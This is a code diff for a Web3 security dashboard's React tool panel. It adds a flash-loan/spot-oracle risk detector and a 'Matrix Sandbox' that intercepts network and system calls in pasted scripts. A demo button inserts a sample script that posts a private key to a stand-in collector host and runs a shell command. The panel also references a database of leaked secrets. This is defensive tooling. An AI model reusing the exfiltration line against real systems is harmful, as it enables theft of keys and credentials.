@@ -20,6 +20,8 @@ import {
   Flame,
   Layers,
   Radar,
+  Zap,
+  Terminal,
 } from "lucide-react";
 import {
   getSavedUser,
@@ -44,7 +46,9 @@ type ToolId =
   | "drift"
   | "hacks"
   | "proxy"
-  | "surface";
+  | "surface"
+  | "flash"
+  | "sandbox";
 
 const TIER_RANK: Record<string, number> = { GUEST: 0, RADAR: 1, RAW: 2, BLACKBOX: 3 };
 
@@ -170,9 +174,11 @@ const ToolsPanel = () => {
     { id: "ospec", labelRu: "OSPEC (Утечки 1.1M)", labelEn: "OSPEC (1.1M Secrets)", icon: KeyRound, minRank: 1, placeholder: "Фильтр по типу секрета или org/repo (пусто = последние находки)" },
     { id: "hacks", labelRu: "DeFiHackLabs (861 взломов)", labelEn: "DeFiHackLabs (861 Exploits)", icon: Flame, minRank: 1, placeholder: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
     { id: "proxy", labelRu: "Proxy & EIP-1967 Инспектор", labelEn: "Proxy & EIP-1967 Inspector", icon: Layers, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+    { id: "flash", labelRu: "Flash-Loan & Spot-Оракул", labelEn: "Flash-Loan & Spot Oracle", icon: Zap, minRank: 1, placeholder: "0x1F98431c8aD98523631AE4a59f267346ea31F984" },
     { id: "surface", labelRu: "Web3 Surface Mapper (Домен)", labelEn: "Web3 Surface Mapper (Domain)", icon: Radar, minRank: 1, placeholder: "across.to / rhino.fi / app.uniswap.org" },
     { id: "drift", labelRu: "Audit Drift (Репозиторий)", labelEn: "Audit Drift (Repo Audits)", icon: GitCompare, minRank: 1, placeholder: "https://github.com/Uniswap/v4-core или org/repo" },
     { id: "zk", labelRu: "ZK / Groth16 аудит", labelEn: "ZK Groth16 Audit", icon: ShieldCheck, minRank: 2, placeholder: "0x... verifier" },
+    { id: "sandbox", labelRu: "Matrix Sandbox v2.2", labelEn: "Matrix Sandbox v2.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
   ];
 
   const run = async () => {
@@ -213,6 +219,12 @@ const ToolsPanel = () => {
       } else if (tool === "surface") {
         path = "/api/tools/surface-map";
         body = { domain: input1.trim() };
+      } else if (tool === "flash") {
+        path = "/api/tools/flash-spot";
+        body = { address: input1.trim(), chain };
+      } else if (tool === "sandbox") {
+        path = "/api/tools/sandbox";
+        body = { code: input1 };
       } else {
         path = "/api/tools/drift-compare";
         body = { repo_url: input1.trim() };
@@ -353,48 +365,90 @@ const ToolsPanel = () => {
         </div>
       ) : (
         <div className="rounded-xl border border-border bg-card p-5 space-y-3">
-          <div className="grid grid-cols-1 gap-3 sm:grid-cols-4">
-            <input
-              value={input1}
-              onChange={(e) => setInput1(e.target.value)}
-              onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || input1) && run()}
-              placeholder={active.placeholder}
-              className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
-            />
-            {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy") ? (
-              <select
-                value={chain}
-                onChange={(e) => setChain(e.target.value)}
-                className="rounded-xl border border-border bg-background px-3 py-3 font-mono text-xs text-foreground outline-none focus:border-primary"
-              >
-                {["ethereum", "bsc", "polygon", "arbitrum", "base", "optimism"].map((c) => (
-                  <option key={c} value={c}>
-                    {c.toUpperCase()}
-                  </option>
-                ))}
-              </select>
-            ) : (
-              <div className="flex items-center rounded-xl border border-border bg-background/60 px-4 py-3 font-mono text-xs text-muted-foreground">
-                {tool === "market"
-                  ? isRu ? "Тикер монеты" : "Coin ticker"
-                  : tool === "social"
-                  ? "X / TG / Discord / GitHub"
-                  : tool === "soroban"
-                  ? "Stellar / Soroban SIM"
-                  : tool === "drift"
-                  ? isRu ? "Папки audits/ + Git Drift" : "audits/ PDFs + Git Drift"
-                  : "OSPEC Harvester DB (RADAR+)"}
+          {tool === "sandbox" ? (
+            <div className="space-y-3">
+              <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
+                <span className="text-muted-foreground">
+                  {isRu
+                    ? "Вставьте подозрительный Python / Web3 скрипт или PoC-эксплойт (вызовы requests/subprocess/os/socket/web3 перехватываются до исполнения):"
+                    : "Paste untrusted Python / Web3 script or PoC (requests/subprocess/os/socket/web3 calls are intercepted pre-execution):"}
+                </span>
+                <button
+                  type="button"
+                  onClick={() =>
+                    setInput1(
+                      `import requests, subprocess\n# Suspicious helper trying to exfiltrate private key & run shell\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["uname", "-a"])\nprint(" Helper finished")`
+                    )
+                  }
+                  className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
+                >
+                  {isRu ? "⚡ Вставить демо-пример эксфильтрации" : "⚡ Load Demo Exfiltration Script"}
+                </button>
               </div>
-            )}
-            <button
-              onClick={run}
-              disabled={loading || (tool !== "ospec" && !input1)}
-              className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
-            >
-              {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
-              <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
-            </button>
-          </div>
+              <textarea
+                rows={5}
+                value={input1}
+                onChange={(e) => setInput1(e.target.value)}
+                placeholder={active.placeholder}
+                className="w-full rounded-xl border border-border bg-background p-3.5 font-mono text-xs text-foreground outline-none focus:border-primary"
+              />
+              <div className="flex justify-end">
+                <button
+                  onClick={run}
+                  disabled={loading || !input1.trim()}
+                  className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-5 py-2.5 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
+                >
+                  {loading ? <Loader2 size={14} className="animate-spin" /> : <Terminal size={14} />}
+                  <span>{loading ? (isRu ? "Перехват вызовов…" : "Intercepting…") : isRu ? "Запустить в Matrix Sandbox" : "Run in Matrix Sandbox"}</span>
+                </button>
+              </div>
+            </div>
+          ) : (
+            <div className="grid grid-cols-1 gap-3 sm:grid-cols-4">
+              <input
+                value={input1}
+                onChange={(e) => setInput1(e.target.value)}
+                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || input1) && run()}
+                placeholder={active.placeholder}
+                className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
+              />
+              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash") ? (
+                <select
+                  value={chain}
+                  onChange={(e) => setChain(e.target.value)}
+                  className="rounded-xl border border-border bg-background px-3 py-3 font-mono text-xs text-foreground outline-none focus:border-primary"
+                >
+                  {["ethereum", "bsc", "polygon", "arbitrum", "base", "optimism"].map((c) => (
+                    <option key={c} value={c}>
+                      {c.toUpperCase()}
+                    </option>
+                  ))}
+                </select>
+              ) : (
+                <div className="flex items-center rounded-xl border border-border bg-background/60 px-4 py-3 font-mono text-xs text-muted-foreground">
+                  {tool === "market"
+                    ? isRu ? "Тикер монеты" : "Coin ticker"
+                    : tool === "social"
+                    ? "X / TG / Discord / GitHub"
+                    : tool === "soroban"
+                    ? "Stellar / Soroban SIM"
+                    : tool === "drift"
+                    ? isRu ? "Папки audits/ + Git Drift" : "audits/ PDFs + Git Drift"
+                    : tool === "surface"
+                    ? "Subdomains + JS Bundles"
+                    : "OSPEC Harvester DB (RADAR+)"}
+                </div>
+              )}
+              <button
+                onClick={run}
+                disabled={loading || (tool !== "ospec" && !input1)}
+                className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
+              >
+                {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
+                <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
+              </button>
+            </div>
+          )}
 
           {/* Quick presets for Audit Drift (GitHub repos with audits/ folders) */}
           {tool === "drift" && (
@@ -1366,6 +1420,150 @@ const ToolsPanel = () => {
         </div>
       )}
 
+      {/* 12. Flash-Loan & Spot-Oracle + Bridge Signature Detector */}
+      {result && tool === "flash" && (
+        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
+          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
+            <div>
+              <span className="text-primary font-bold">{result.address}</span>
+              <span className="ml-2 text-muted-foreground">({result.chain})</span>
+            </div>
+            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
+              {result.verdict} · Score: {result.composite_score}
+            </span>
+          </div>
+
+          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">SPOT Oracle Score</p>
+              <p className="mt-1 text-sm font-bold text-red-400">{result.spot_oracle?.spot_score ?? 0}</p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">TWAP / Chainlink Defense</p>
+              <p className="mt-1 text-sm font-bold text-green-400">{result.spot_oracle?.protection_score ?? 0}</p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">FlashLoan Callbacks</p>
+              <p className="mt-1 text-sm font-bold text-amber-400">{result.spot_oracle?.flash_score ?? 0}</p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Monetizers (Borrow/Liq)</p>
+              <p className="mt-1 text-sm font-bold text-primary">{result.spot_oracle?.monetizer_score ?? 0}</p>
+            </div>
+          </div>
+
+          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
+              <p className="text-[10px] uppercase text-primary font-bold">
+                {isRu ? "Признаки SPOT-цены и монетизации" : "Detected SPOT Reads & Monetizers"}
+              </p>
+              {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].length === 0 ? (
+                <p className="text-[11px] text-muted-foreground">—</p>
+              ) : (
+                <div className="space-y-1">
+                  {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].map((s: any, idx: number) => (
+                    <div key={idx} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1 text-[11px]">
+                      <span className="text-foreground">{s.name}</span>
+                      <span className="text-primary font-bold">×{s.hits}</span>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+
+            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
+              <p className="text-[10px] uppercase text-primary font-bold">
+                {isRu ? "Защитные оракулы и байткод-сигнатуры мостов" : "Oracle Defenses & Bridge Bytecode Signatures"}
+              </p>
+              {(result.spot_oracle?.protection || []).map((p: any, idx: number) => (
+                <div key={idx} className="flex items-center justify-between rounded border border-green-500/30 bg-green-500/10 px-2.5 py-1 text-[11px] text-green-400">
+                  <span>🛡️ {p.name}</span>
+                  <b>×{p.hits}</b>
+                </div>
+              ))}
+              {result.bytecode_signatures && Object.keys(result.bytecode_signatures).length > 0 && (
+                <div className="pt-1 flex flex-wrap gap-1.5">
+                  {Object.entries(result.bytecode_signatures).map(([cat, sels]: [string, any]) => (
+                    <span key={cat} className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
+                      {cat}: {Array.isArray(sels) ? sels.length : 1}
+                    </span>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* 13. Matrix Sandbox v2.2 (Call Interceptor) */}
+      {result && tool === "sandbox" && (
+        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
+          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
+            <span className="font-bold text-foreground">Matrix Sandbox v2.2 ({result.status})</span>
+            <span
+              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
+                String(result.verdict).startsWith("CRITICAL")
+                  ? "border-red-500/50 bg-red-500/15 text-red-400"
+                  : "border-green-500/50 bg-green-500/15 text-green-400"
+              }`}
+            >
+              {result.verdict}
+            </span>
+          </div>
+
+          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Imports Found</p>
+              <p className="mt-1 font-bold text-foreground">
+                {(result.imports_found || []).join(", ") || "None"}
+              </p>
+            </div>
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground">Dangerous Modules Mocked</p>
+              <p className="mt-1 font-bold text-primary">
+                {(result.dangerous_mocked || []).join(", ") || "None"}
+              </p>
+            </div>
+          </div>
+
+          <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
+            <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
+              {isRu
+                ? `Перехваченные системные и сетевые вызовы (${result.intercepted_count || 0}):`
+                : `Intercepted System & Network Calls (${result.intercepted_count || 0}):`}
+            </p>
+            {(result.intercepted_calls || []).length === 0 ? (
+              <p className="text-[11px] text-muted-foreground">
+                {isRu ? "Опасных вызовов не зафиксировано." : "No dangerous calls intercepted."}
+              </p>
+            ) : (
+              <div className="space-y-1.5 max-h-60 overflow-y-auto">
+                {(result.intercepted_calls || []).map((ic: any, idx: number) => (
+                  <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-red-500/30 bg-red-500/5 px-3 py-1.5 text-[11px]">
+                    <span className="font-bold text-red-400">
+                      [{ic.module}] → {ic.call}
+                    </span>
+                    <code className="text-foreground break-all">
+                      {Array.isArray(ic.args) ? ic.args.join(", ") : JSON.stringify(ic.args)}
+                    </code>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+
+          {(result.stdout || result.stderr) && (
+            <div className="rounded-lg border border-border bg-background p-3">
+              <p className="text-[10px] uppercase text-muted-foreground mb-1">Sandbox Output (stdout / stderr)</p>
+              <pre className="whitespace-pre-wrap text-[11px] text-foreground">
+                {result.stdout}
+                {result.stderr ? `\n[stderr] ${result.stderr}` : ""}
+              </pre>
+            </div>
+          )}
+        </div>
+      )}
+
       {/* TOOL RUN HISTORY (Holders & Whales, Market & Derivatives, Funds Flow 14d, Social, Soroban, OSPEC) */}
       <div className="rounded-xl border border-border bg-card p-5">
         <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
@@ -1388,7 +1586,9 @@ const ToolsPanel = () => {
               { id: "ospec", label: "OSPEC" },
               { id: "hacks", label: "DeFiHackLabs" },
               { id: "proxy", label: "Proxy" },
+              { id: "flash", label: "Flash/Spot" },
               { id: "surface", label: "Surface" },
+              { id: "sandbox", label: "Sandbox" },
             ].map((f) => (
               <button
                 key={f.id}
